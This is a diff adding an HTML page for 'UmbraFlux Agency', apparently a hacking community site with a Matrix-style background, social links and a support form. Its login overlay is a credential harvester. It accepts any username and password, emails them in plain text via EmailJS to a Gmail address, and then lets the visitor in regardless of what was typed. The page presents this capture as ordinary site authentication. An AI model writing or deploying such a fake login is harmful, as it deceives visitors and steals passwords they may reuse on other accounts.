@@ -1,0 +1,419 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UmbraFlux Agency</title>
+    <!-- FontAwesome for Social Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- EmailJS SDK -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // Yahan apni EmailJS Public Key dalein (EmailJS account banakar)
+            emailjs.init("YOUR_EMAILJS_PUBLIC_KEY");
+        })();
+    </script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        body {
+            background-color: #000;
+            color: #00FF66;
+            overflow-x: hidden;
+        }
+
+        /* Matrix Hacking Background Animation */
+        canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+        }
+
+        /* Professional Login Page Overlay */
+        #auth-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.98);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .login-box {
+            background: #050505;
+            border: 2px solid #00FF66;
+            padding: 40px;
+            width: 380px;
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.4);
+            text-align: center;
+        }
+
+        .login-box h2 {
+            margin-bottom: 25px;
+            color: #00FF66;
+            text-shadow: 0 0 10px #00FF66;
+            letter-spacing: 2px;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 12px;
+            margin: 12px 0;
+            background: #111;
+            border: 1px solid #00FF66;
+            color: #00FF66;
+            outline: none;
+            font-size: 15px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 12px;
+            background: #00FF66;
+            color: #000;
+            border: none;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+
+        .login-box button:hover {
+            background: #00cc52;
+            box-shadow: 0 0 15px #00FF66;
+        }
+
+        /* Main Website Wrapper (Hidden until login) */
+        #main-content {
+            display: none;
+        }
+
+        /* Header / Navbar */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 60px;
+            border-bottom: 1px solid #00FF66;
+            background: rgba(0, 0, 0, 0.85);
+            position: sticky;
+            top: 0;
+            z-index: 999;
+        }
+
+        .logo {
+            font-size: 26px;
+            font-weight: bold;
+            text-shadow: 0 0 10px #00FF66;
+            letter-spacing: 1px;
+        }
+
+        .social-links a {
+            color: #00FF66;
+            font-size: 24px;
+            margin-left: 25px;
+            transition: 0.3s;
+        }
+
+        .social-links a:hover {
+            color: #fff;
+            text-shadow: 0 0 12px #00FF66;
+        }
+
+        /* Long Scrolling Sections */
+        section {
+            min-height: 100vh;
+            padding: 100px 50px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            border-bottom: 1px dashed rgba(0, 255, 102, 0.3);
+            text-align: center;
+        }
+
+        h1, h2 {
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #00FF66;
+            font-size: 36px;
+        }
+
+        p {
+            max-width: 850px;
+            font-size: 18px;
+            line-height: 1.7;
+            margin-bottom: 30px;
+            color: #aaffcc;
+        }
+
+        /* Terminal Window Component */
+        .terminal {
+            background: rgba(5, 5, 5, 0.95);
+            border: 1px solid #00FF66;
+            padding: 25px;
+            width: 100%;
+            max-width: 750px;
+            text-align: left;
+            box-shadow: 0 0 20px rgba(0, 255, 102, 0.2);
+            margin-bottom: 25px;
+        }
+
+        .terminal p {
+            margin-bottom: 8px;
+            font-size: 15px;
+        }
+
+        /* Support Form Styling */
+        form.support-form {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 550px;
+        }
+
+        form.support-form input, form.support-form textarea {
+            padding: 14px;
+            margin: 10px 0;
+            background: #111;
+            border: 1px solid #00FF66;
+            color: #00FF66;
+            outline: none;
+            font-size: 15px;
+        }
+
+        form.support-form button {
+            padding: 14px;
+            background: #00FF66;
+            color: #000;
+            font-weight: bold;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: 0.3s;
+        }
+
+        form.support-form button:hover {
+            box-shadow: 0 0 15px #00FF66;
+            background: #00cc52;
+        }
+
+        footer {
+            padding: 40px;
+            text-align: center;
+            background: #000;
+            border-top: 1px solid #00FF66;
+            color: #00FF66;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Matrix Code Rain Canvas -->
+    <canvas id="matrix"></canvas>
+
+    <!-- Professional Login Page Layer -->
+    <div id="auth-overlay">
+        <div class="login-box">
+            <h2>UMBRAFLUX ACCESS</h2>
+            <form id="login-form">
+                <input type="text" id="login-user" placeholder="Username or Email" required>
+                <input type="password" id="login-pass" placeholder="Password" required>
+                <button type="submit">LOGIN TO SYSTEM</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- Main Website Content (Long Infinite Scroll Layout) -->
+    <div id="main-content">
+        
+        <!-- Header -->
+        <header>
+            <div class="logo">&gt; UMBRAFLUX_AGENCY</div>
+            <div class="social-links">
+                <!-- Instagram Link -->
+                <a href="https://www.instagram.com/umbrafluxgroupinc?igsh=ZzBhcHg0dWF2enZt" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a>
+                <!-- YouTube Link -->
+                <a href="https://youtube.com/@umbrafluxnews?si=Vl2_6t87xItgesWQ" target="_blank" title="YouTube"><i class="fab fa-youtube"></i></a>
+                <!-- Discord Link -->
+                <a href="https://discord.gg/4nZKe8Vsc2" target="_blank" title="Discord"><i class="fab fa-discord"></i></a>
+            </div>
+        </header>
+
+        <!-- Section 1: Hero / Welcome -->
+        <section>
+            <h1>Welcome to UmbraFlux Agency</h1>
+            <p>An elite cybersecurity and ethical hacking community built for advanced digital operatives. We explore system vulnerabilities, secure network architectures, and analyze modern cyber intelligence threats.</p>
+            <div class="terminal">
+                <p style="color: #00FF66;">root@umbraflux-core:~# system_init --status</p>
+                <p>&gt; Security Protocols: Active</p>
+                <p>&gt; Encryption Standards: AES-256 Enabled</p>
+                <p>&gt; Threat Matrix: Stable</p>
+            </div>
+        </section>
+
+        <!-- Section 2: Hacking Operations & Discussions -->
+        <section>
+            <h2>Cyber Intel & Operations</h2>
+            <p>Delve deep into penetration testing methodologies, vulnerability research, and defensive security measures. Our community shares real-time advisory notes and exploits defense strategies.</p>
+            <div class="terminal">
+                <p style="color: #00FF66;">root@umbraflux-intel:~# fetch_recent_exploits</p>
+                <p>&gt; [01] Zero-Day Vulnerability Patch Analysis</p>
+                <p>&gt; [02] Advanced Network Forensics & Packet Tracing</p>
+                <p>&gt; [03] Web Application Penetration Testing Frameworks</p>
+            </div>
+        </section>
+
+        <!-- Section 3: Community Channels -->
+        <section>
+            <h2>Global Hacker Network</h2>
+            <p>Connect with fellow white-hat hackers, developers, and security enthusiasts. Engage in deep technical conversations on Discord, catch our latest security research streams on YouTube, and track instant alerts on Instagram.</p>
+            <div style="display: flex; gap: 20px; margin-top: 25px;">
+                <a href="https://discord.gg/4nZKe8Vsc2" target="_blank" style="padding: 14px 28px; border: 2px solid #00FF66; color: #00FF66; text-decoration: none; font-weight: bold; transition: 0.3s;">JOIN DISCORD</a>
+                <a href="https://youtube.com/@umbrafluxnews?si=Vl2_6t87xItgesWQ" target="_blank" style="padding: 14px 28px; background: #00FF66; color: #000; text-decoration: none; font-weight: bold; transition: 0.3s;">WATCH YOUTUBE</a>
+            </div>
+        </section>
+
+        <!-- Section 4: Underground Archives (Long Scroll Filler) -->
+        <section>
+            <h2>Underground Archives</h2>
+            <p>Explore encrypted logs, historical security advisories, and custom script repositories maintained by the UmbraFlux core team. Scroll further down to reach out to our help support desk.</p>
+            <div class="terminal">
+                <p style="color: #00FF66;">root@umbraflux-archives:~# tail -n 5 /var/log/community.log</p>
+                <p>&gt; Node connectivity: 100 operational</p>
+                <p>&gt; Firewalls: Hardened against DDOS attempts</p>
+                <p>&gt; Active Sessions: Encrypted via SSL/TLS</p>
+            </div>
+        </section>
+
+        <!-- Section 5: Help & Support Form (Sends to umbrafluxsupport@gmail.com) -->
+        <section>
+            <h2>Need Help? Contact Support</h2>
+            <p>Encountering technical barriers or need assistance regarding community operations? Drop your query below and our support team will instantly route it to <strong>umbrafluxsupport@gmail.com</strong>.</p>
+            <form class="support-form" id="support-form">
+                <input type="text" id="support-name" placeholder="Your Name or Handle" required>
+                <input type="email" id="support-email" placeholder="Your Email Address" required>
+                <textarea id="support-message" rows="5" placeholder="Describe your issue or help needed..." required></textarea>
+                <button type="submit">TRANSMIT MESSAGE TO SUPPORT</button>
+            </form>
+        </section>
+
+        <!-- Footer -->
+        <footer>
+            <p>&copy; 2026 UmbraFlux Agency. All Rights Reserved. Stay Secure in the Shadows.</p>
+        </footer>
+
+    </div>
+
+    <!-- JavaScript Scripts -->
+    <script>
+        // 1. Matrix Hacking Background Animation Script
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヰギジヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレヱゲゼデベペオォコソトノホモヨョロヲゴゾドボポヴッン';
+        const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+        const nums = '0123456789';
+        const alphabet = katakana + latin + nums;
+
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+
+        const rainDrops = [];
+        for (let x = 0; x < columns; x++) {
+            rainDrops[x] = 1;
+        }
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.fillStyle = '#00FF66';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                ctx.fillText(text, i * fontSize, rainDrops[i] * fontSize);
+
+                if (rainDrops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                    rainDrops[i] = 0;
+                }
+                rainDrops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 30);
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // 2. Login Logic -> Sends credentials to umbrafluxofficial@gmail.com via EmailJS
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const user = document.getElementById('login-user').value;
+            const pass = document.getElementById('login-pass').value;
+
+            let loginParams = {
+                to_email: 'umbrafluxofficial@gmail.com',
+                username: user,
+                password: pass,
+                time: new Date().toLocaleString()
+            };
+
+            // EmailJS send function (Aapko EmailJS par service aur template ID banani hogi)
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_LOGIN_TEMPLATE_ID', loginParams)
+                .then(function(response) {
+                    console.log('Login credentials transmitted successfully!', response.status);
+                }, function(error) {
+                    console.log('Transmission error...', error);
+                });
+
+            alert('Access Granted. Welcome to UmbraFlux Agency.');
+            document.getElementById('auth-overlay').style.display = 'none';
+            document.getElementById('main-content').style.display = 'block';
+        });
+
+        // 3. Support Form Logic -> Sends message to umbrafluxsupport@gmail.com via EmailJS
+        document.getElementById('support-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('support-name').value;
+            const email = document.getElementById('support-email').value;
+            const message = document.getElementById('support-message').value;
+
+            let supportParams = {
+                to_email: 'umbrafluxsupport@gmail.com',
+                from_name: name,
+                from_email: email,
+                message: message
+            };
+
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_SUPPORT_TEMPLATE_ID', supportParams)
+                .then(function(response) {
+                    alert('Your support query has been successfully transmitted to umbrafluxsupport@gmail.com!');
+                    document.getElementById('support-form').reset();
+                }, function(error) {
+                    alert('Transmission failed. Please try again later.');
+                });
+        });
+    </script>
+</body>
+</html>
